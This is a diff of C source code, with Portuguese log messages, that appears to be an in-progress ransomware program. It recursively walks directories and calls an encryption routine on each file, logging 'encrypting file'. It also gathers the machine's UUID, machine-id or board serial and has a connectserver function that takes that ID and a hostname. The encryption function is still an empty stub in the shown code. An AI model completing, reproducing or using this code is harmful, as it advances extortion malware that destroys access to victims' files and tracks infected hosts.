@@ -22,33 +22,39 @@ void WhatIsDir(char *dir_sch){
 	struct stat verify;
 
 	DIR *dir;
-	char pathdir[1024];
+	char file_path[1024];
 	dir = opendir(dir_sch);
 
-	if(dir == NULL){
+	if(!dir){
 		fprintf(stderr, "[INFO]: Ocorreu um erro ao tentar ler diretorio: %s\n",
 						dir_sch);
 		return;
 	}
 	
-	while((getdir = readdir(dir)) != NULL){
+	while((getdir = readdir(dir))){
 
 		if(strncmp(getdir->d_name,".", sizeof(getdir->d_name)) == 0 ||
 				strncmp(getdir->d_name,"..", sizeof(getdir->d_name)) == 0)
 					continue;
 
-		sprintf(pathdir , "%s%s",dir_sch , getdir->d_name);
+		sprintf(file_path , "%s%s", dir_sch, getdir->d_name);
 
-		stat(pathdir , &verify);
-		strncat(pathdir, "/", sizeof(pathdir)-1);
+		stat(file_path , &verify);
+		strncat(file_path, "/", sizeof(file_path)-1);
 
 		if(S_ISDIR(verify.st_mode)){
-			printf("[ENTRANDO NO DIRETORIO]:  %s\n", pathdir);
-			WhatIsDir(pathdir);
+			printf("[ENTRANDO NO DIRETORIO]:  %s\n", file_path);
+			WhatIsDir(file_path);
 
 		} else {
-			printf("[CRIPTOGRAFANDO ARQUIVO]:  %s\n", pathdir);
-			encryptfile(pathdir);
+			char file_name[1024] = {0};
+
+			for(int i = 0; i < strlen(file_path) - 1; i++)
+				file_name[i] = file_path[i];
+
+			printf("[CRIPTOGRAFANDO ARQUIVO]:  %s\n", file_name);
+
+			encryptfile(file_path);
 		}
 	}
 
@@ -86,7 +92,7 @@ void connectserver(char *uuid, char *hostname){
 
 }
 
-void encryptfile(char *name_dir){
+void encryptfile(char *file_to_encrypt){
 	//int len = sizeof(getdir->d_name);
 }
 
@@ -101,13 +107,13 @@ char *getuuid(void){
 	uuid = fopen("/sys/class/dmi/id/product_uuid", "r");
 	memcpy(&type, "product_uuid", sizeof(type));
 
-	if(uuid == NULL){
+	if(!uuid){
 
 		memset(type, '\0', sizeof(type));
 		memcpy(&type, "machine-id", sizeof(type));
 		uuid = fopen("/etc/machine-id", "r");
 
-		if(uuid == NULL){
+		if(!uuid){
 
 			memset(type, '\0', sizeof(type));
 			memcpy(&type, "board_serial", sizeof(type));
